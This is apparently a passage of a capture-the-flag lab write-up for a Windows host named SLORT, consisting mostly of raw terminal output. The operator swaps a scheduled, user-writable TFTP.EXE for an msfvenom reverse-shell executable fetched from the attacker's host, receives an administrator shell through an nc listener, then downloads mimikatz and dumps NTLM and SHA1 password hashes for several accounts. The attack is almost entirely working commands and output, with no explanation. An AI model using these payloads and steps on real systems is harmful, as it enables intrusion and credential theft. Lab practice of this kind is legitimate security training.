2020-06-11 07:37:26, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:37:26, Info                  MIG    MigHost started with command line: {D818C1A1-E0FF-4744-B1F4-8E69AA4581A2} /InitDoneEvent:MigHost.{D818C1A1-E0FF-4744-B1F4-8E69AA4581A2}.Event /ParentPID:9040
2020-06-11 07:37:26, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:37:26, Info                  MIG    MigHost: Initialized successfully with CLSID[{D818C1A1-E0FF-4744-B1F4-8E69AA4581A2}] and LogDir=[]
2020-06-11 07:37:26, Info                  MIG    MigHost: Exiting process.
2020-06-11 07:43:50, Info                  MIG    MigHost started with command line: {348C9C1D-D6A5-42E2-87EE-5DF53E8FA05B} /InitDoneEvent:MigHost.{348C9C1D-D6A5-42E2-87EE-5DF53E8FA05B}.Event /ParentPID:8220
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::Init: Successfully initialized surrogate.
2020-06-11 07:43:50, Info                  MIG    MigHost: Initialized successfully with CLSID[{348C9C1D-D6A5-42E2-87EE-5DF53E8FA05B}] and LogDir=[]
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::LoadDllServer in progress: BinaryPath=[C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll], CLSID=[{D26AA4A5-92AD-48DB-8D59-95EF0DCE6939}], ApartmentThreadingModel=[0].
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::COMGenericThreadingHostThreadProc: ThreadID=[0x1df8], Server=[C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll], CLSID=[{D26AA4A5-92AD-48DB-8D59-95EF0DCE6939}], ApartmentThreadingModel=[0]
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::LoadAndRegisterServerInThreadContext: Loaded server(C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll)
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::LoadAndRegisterServerInThreadContext: Successfully loaded and registered server(C:\$WINDOWS.~BT\Sources\ReplacementManifests\Microsoft-Windows-RasServer-MigPlugin\RasMigPlugin.dll)
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::COMGenericThreadingHostThreadProc: LoadAndRegisterServerInThreadContext() succeeded.
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::LoadDllServer finished: Result=[0x0].
2020-06-11 07:43:50, Info                  MIG    MigHost: CMigPluginSurrogate::COMGenericThreadingHostThreadProc: Exiting ThreadID=[0x1df8].
2020-06-11 07:43:50, Info                  MIG    MigHost: Exiting process.
PS C:\Backup> type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
PS C:\Backup> copy TFTP.EXE TFTP.EXE.BAK
PS C:\Backup> dir


    Directory: C:\Backup


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/12/2020   7:45 AM          11304 backup.txt                                                           
-a----         6/12/2020   7:45 AM             73 info.txt                                                             
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE                                                             
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE.BAK                                                         


PS C:\Backup> icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files
PS C:\Backup> net groups
PS C:\Backup> net group
PS C:\Backup> systeminfo      

Host Name:                 SLORT
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Admin
Registered Organization:   
Product ID:                00331-10000-00001-AA001
Original Install Date:     12/3/2021, 8:37:40 AM
System Boot Time:          12/8/2021, 10:31:25 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.17369862.B64.2012240522, 12/24/2020
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,249 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,699 MB
Virtual Memory: In Use:    2,100 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\SLORT
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5007289
                           [02]: KB4562830
                           [03]: KB5007253
                           [04]: KB5006753
                           [05]: KB5007273
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.225.53
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\Backup> del TFTP.EXE
PS C:\Backup> wget 192.168.49.225/reverse.exe -O TFTP.EXE 
PS C:\Backup> dir


    Directory: C:\Backup


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/12/2020   7:45 AM          11304 backup.txt                                                           
-a----         6/12/2020   7:45 AM             73 info.txt                                                             
-a----         1/16/2022   4:44 AM           7168 TFTP.EXE                                                             
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE.BAK                                                         


PS C:\Backup> 

```

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.225 LPORT=443 -f exe -o reverse.exe                                                                  1 ⚙
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                                                                  1 ⚙
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.225.53 - - [16/Jan/2022 07:44:40] "GET /reverse.exe HTTP/1.1" 200 -


```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443                                                                                                                                             130 ⨯
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.225] from (UNKNOWN) [192.168.225.53] 50061
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator

C:\WINDOWS\system32>cd \Users\Administrator\Desktop
cd \Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
4cedef4ecdfa0aa94e3745549a31ff5f

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.225.53
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.225.254

C:\Users\Administrator\Desktop>
```

![](Pasted%20image%2020220116204848.png)

# Post Exploitation
```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Users\Administrator\Desktop

12/03/2021  09:04 AM    <DIR>          .
12/03/2021  09:04 AM    <DIR>          ..
01/16/2022  03:44 AM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  28,412,788,736 bytes free

C:\Users\Administrator\Desktop>cd ..
cd ..

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Users\Administrator

12/03/2021  08:40 AM    <DIR>          .
12/03/2021  08:40 AM    <DIR>          ..
12/03/2021  08:56 AM    <DIR>          3D Objects
12/03/2021  08:56 AM    <DIR>          Contacts
12/03/2021  09:04 AM    <DIR>          Desktop
12/03/2021  08:56 AM    <DIR>          Documents
12/03/2021  08:56 AM    <DIR>          Downloads
12/03/2021  08:56 AM    <DIR>          Favorites
12/03/2021  08:56 AM    <DIR>          Links
12/03/2021  08:56 AM    <DIR>          Music
12/03/2021  06:07 AM    <DIR>          OneDrive
12/03/2021  08:56 AM    <DIR>          Pictures
12/03/2021  08:56 AM    <DIR>          Saved Games
12/03/2021  08:56 AM    <DIR>          Searches
12/03/2021  08:56 AM    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  28,412,788,736 bytes free

C:\Users\Administrator>wget 192.168.49.225/mimikatz.exe
wget 192.168.49.225/mimikatz.exe
'wget' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator> wget 192.168.49.225/mimikatz.exe -O mimikatz.exe
wget 192.168.49.225/mimikatz.exe -O mimikatz.exe
PS C:\Users\Administrator> exit    
exit

C:\Users\Administrator>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurla::logonpasswords
ERROR mimikatz_doLocal ; "sekurla" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -  
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 23392019 (00000000:0164ef13)
Session           : Batch from 0
User Name         : Administrator
Domain            : SLORT
Logon Server      : SLORT
Logon Time        : 1/16/2022 4:45:00 AM
SID               : S-1-5-21-2032240294-1210393520-1520670448-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SLORT
         * NTLM     : a9de662256cb18fcee3cf84997730d95
         * SHA1     : 0eddf8a2a191d169294ba33a39e4cac6f4b897d6
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 1460805 (00000000:00164a45)
Session           : Interactive from 0
User Name         : Administrator
Domain            : SLORT
Logon Server      : SLORT
Logon Time        : 1/16/2022 3:44:02 AM
SID               : S-1-5-21-2032240294-1210393520-1520670448-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SLORT
         * NTLM     : a9de662256cb18fcee3cf84997730d95
         * SHA1     : 0eddf8a2a191d169294ba33a39e4cac6f4b897d6
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 1422269 (00000000:0015b3bd)
Session           : Interactive from 0
User Name         : Administrator
Domain            : SLORT
Logon Server      : SLORT
Logon Time        : 1/16/2022 3:43:57 AM
SID               : S-1-5-21-2032240294-1210393520-1520670448-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SLORT
         * NTLM     : a9de662256cb18fcee3cf84997730d95
         * SHA1     : 0eddf8a2a191d169294ba33a39e4cac6f4b897d6
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 1404101 (00000000:00156cc5)
Session           : Interactive from 0
User Name         : Administrator
Domain            : SLORT
Logon Server      : SLORT
Logon Time        : 1/16/2022 3:43:51 AM
SID               : S-1-5-21-2032240294-1210393520-1520670448-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SLORT
         * NTLM     : a9de662256cb18fcee3cf84997730d95
         * SHA1     : 0eddf8a2a191d169294ba33a39e4cac6f4b897d6
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 1288632 (00000000:0013a9b8)
Session           : Interactive from 0
User Name         : Administrator
Domain            : SLORT
Logon Server      : SLORT
Logon Time        : 12/8/2021 10:33:59 AM
SID               : S-1-5-21-2032240294-1210393520-1520670448-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SLORT
         * NTLM     : a9de662256cb18fcee3cf84997730d95
         * SHA1     : 0eddf8a2a191d169294ba33a39e4cac6f4b897d6
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : SLORT
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 292577 (00000000:000476e1)
Session           : Interactive from 1
User Name         : rupert
Domain            : SLORT
Logon Server      : SLORT
Logon Time        : 12/8/2021 10:31:46 AM
SID               : S-1-5-21-2032240294-1210393520-1520670448-1002
        msv :
         [00000003] Primary
         * Username : rupert
         * Domain   : SLORT
         * NTLM     : 5bc987e664bc378a5c5adfcb8d996643
         * SHA1     : c876920cbd160ac014ff58ba82bab14070a7fc9b
        tspkg :
        wdigest :
         * Username : rupert
         * Domain   : SLORT
         * Password : (null)
        kerberos :
         * Username : rupert
         * Domain   : SLORT
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:39 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 71314 (00000000:00011692)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:39 AM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : SLORT$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 71286 (00000000:00011676)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:39 AM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : SLORT$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SLORT$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:39 AM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : SLORT$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : slort$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 41864 (00000000:0000a388)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:38 AM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : SLORT$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 41856 (00000000:0000a380)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:38 AM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : SLORT$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 40648 (00000000:00009ec8)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:38 AM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SLORT$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 12/8/2021 10:31:38 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SLORT$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : slort$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

mimikatz # 

```

# Others